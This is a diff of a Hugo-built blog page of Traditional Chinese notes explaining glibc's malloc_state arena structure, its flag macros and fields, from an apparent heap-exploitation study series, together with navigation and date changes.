+</span></span></span><span class="line"><span class="cl"><span class="cm">     free_list_lock in arena.c.  */</span>
+</span></span><span class="line"><span class="cl">  <span class="n">INTERNAL_SIZE_T</span> <span class="n">attached_threads</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="cm">/* Memory allocated from the system in this arena.  */</span>
+</span></span><span class="line"><span class="cl">  <span class="n">INTERNAL_SIZE_T</span> <span class="n">system_mem</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">INTERNAL_SIZE_T</span> <span class="n">max_system_mem</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span></code></pre></div><p>glibc是用<code>malloc state</code>這個結構來實現arena的功能的，其中有幾個重要的成員變數:</p>
 <ul>
-<li><a href="https://blog.csdn.net/m0_64195960/article/details/125371765" target="_blank">reference</a></li>
+<li>
+<p><strong>mutex</strong>: 互斥鎖，防止多個thread同時讀寫同一個分配區</p>
+</li>
+<li>
+<p><strong>flags</strong>: 記錄了一些分配區的標誌，具體如下</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm">FASTCHUNKS_BIT held in max_fast indicates that there are probably
+</span></span></span><span class="line"><span class="cl"><span class="cm">some fastbin chunks. It is set true on entering a chunk into any
+</span></span></span><span class="line"><span class="cl"><span class="cm">fastbin, and cleared only in malloc_consolidate.
+</span></span></span><span class="line"><span class="cl"><span class="cm">The truth value is inverted so that have_fastchunks will be true
+</span></span></span><span class="line"><span class="cl"><span class="cm">upon startup (since statics are zero-filled), simplifying
+</span></span></span><span class="line"><span class="cl"><span class="cm">initialization checks.
+</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#define FASTCHUNKS_BIT (1U)
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define have_fastchunks(M) (((M)-&gt;flags &amp; FASTCHUNKS_BIT) == 0)
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define clear_fastchunks(M) catomic_or(&amp;(M)-&gt;flags, FASTCHUNKS_BIT)
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define set_fastchunks(M) catomic_and(&amp;(M)-&gt;flags, ~FASTCHUNKS_BIT)
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm">NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous
+</span></span></span><span class="line"><span class="cl"><span class="cm">regions.  Otherwise, contiguity is exploited in merging together,
+</span></span></span><span class="line"><span class="cl"><span class="cm">when possible, results from consecutive MORECORE calls.
+</span></span></span><span class="line"><span class="cl"><span class="cm">The initial value comes from MORECORE_CONTIGUOUS, but is
+</span></span></span><span class="line"><span class="cl"><span class="cm">changed dynamically if mmap is ever used as an sbrk substitute.
+</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#define NONCONTIGUOUS_BIT (2U)
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define contiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) == 0)
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define noncontiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) != 0)
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define set_noncontiguous(M) ((M)-&gt;flags |= NONCONTIGUOUS_BIT)
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define set_contiguous(M) ((M)-&gt;flags &amp;= ~NONCONTIGUOUS_BIT)
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="cm">/* ARENA_CORRUPTION_BIT is set if a memory corruption was detected on the
+</span></span></span><span class="line"><span class="cl"><span class="cm">arena.  Such an arena is no longer used to allocate chunks.  Chunks
+</span></span></span><span class="line"><span class="cl"><span class="cm">allocated in that arena before detecting corruption are not freed.  */</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#define ARENA_CORRUPTION_BIT (4U)
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define arena_is_corrupt(A) (((A)-&gt;flags &amp; ARENA_CORRUPTION_BIT))
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define set_arena_corrupt(A) ((A)-&gt;flags |= ARENA_CORRUPTION_BIT)
+</span></span></span></code></pre></div><ul>
+<li><strong>FASTCHUNKS_BIT</strong>: 表示分配區是否有fastbin chunk 1:有 0:沒有</li>
+<li><strong>NONCONTIGUOUS_BIT</strong>: 是否回傳連續的分配區 0:連續 1:不連續
+<ul>
+<li>在主分配區系統會用sbrk()來擴展記憶體，所以分配趨是連續的</li>
+<li>而在非主分配區系統會用mmap()來映射記憶體，所以非配區會不連續</li>
+</ul>
+</li>
+<li><strong>ARENA_CORRUPTION_BIT</strong>: 記憶體是否損壞
+<ul>
+<li>當<code>ARENA_CORRUPTION_BIT</code>被設置(1)時，glibc會報錯並終止程式</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>fastbinsY</strong>: 各個fastbin的起始pointer</p>
+</li>
+<li>
+<p><strong>top</strong>: 指向top chunk</p>
+</li>
+<li>
+<p><strong>last_reminder</strong>: chunk被切割後的剩下的那塊</p>
+</li>
+<li>
+<p><strong>bins</strong>: 包含unsortedbin、smallbin、largebin的起始點</p>
+</li>
+<li>
+<p><strong>binmaps</strong>:
+在檢查bins，不可能一個一個去訪問，所以會把每個bin鍊的狀態用都一個bit來儲存，這樣用binary位移的方式訪問會比較快</p>
+</li>
+</ul>
+
+
+<h2 class="relative group">References 
+    <div id="references" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#references" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<ul>
+<li><a href="https://kiprey.github.io/2020/03/heap-1-arena/" target="_blank">https://kiprey.github.io/2020/03/heap-1-arena/</a></li>
+<li><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/heap-structure/#malloc_state" target="_blank">https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/heap-structure/#malloc_state</a></li>
 </ul>
 
           
@@ -1875,9 +1732,7 @@
     
     <div
         class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
-        <a href="http://localhost:1313/notes/pwn/heap/4-arena/">
-            Part 4: Arena
-        </a>
+        Part 4: This Article
     </div>
     
     
@@ -1893,7 +1748,9 @@
     
     <div
         class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
-        Part 10: This Article
+        <a href="http://localhost:1313/notes/pwn/heap/unsafe-unlink/">
+            Part 10: Unsafe Unlink
+        </a>
     </div>
     
     
@@ -1923,8 +1780,8 @@
           
         
       <script>
-        var oid = "views_notes\\pwn\\heap\\unsafe-unlink\\index.md"
-        var oid_likes = "likes_notes\\pwn\\heap\\unsafe-unlink\\index.md"
+        var oid = "views_notes\\pwn\\heap\\4-arena\\index.md"
+        var oid_likes = "likes_notes\\pwn\\heap\\4-arena\\index.md"
       </script>
       
       
@@ -1944,7 +1801,7 @@
       <div class="flex justify-between pt-3">
         <span>
           
-            <a class="flex group mr-3" href="/notes/pwn/heap/unsorted-bin-attack/">
+            <a class="flex group mr-3" href="/notes/pwn/heap/3-bin/">
               <span
                 class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                 >&larr;</span
@@ -1956,11 +1813,11 @@
               <span class="flex flex-col">
                 <span
                   class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >Unsorted Bin Attack</span
+                  >Bin</span
                 >
                 <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                   
-                    <time datetime="2024-12-20 00:00:00 &#43;0000 UTC">2024-12-20</time>
+                    <time datetime="2025-01-30 00:00:00 &#43;0000 UTC">2025-01-30</time>
                   
                 </span>
               </span>
@@ -1968,28 +1825,6 @@
           
         </span>
         <span>
-          
-            <a class="flex text-right group ml-3" href="/notes/pwn/heap/5-malloc/">
-              <span class="flex flex-col">
-                <span
-                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >Malloc & free</span
-                >
-                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
-                  
-                    <time datetime="2025-02-09 00:00:00 &#43;0000 UTC">2025-02-09</time>
-                  
-                </span>
-              </span>
-              <span
-                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
-                >&rarr;</span
-              >
-              <span
-                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
-                >&larr;</span
-              >
-            </a>
           
         </span>
       </div>
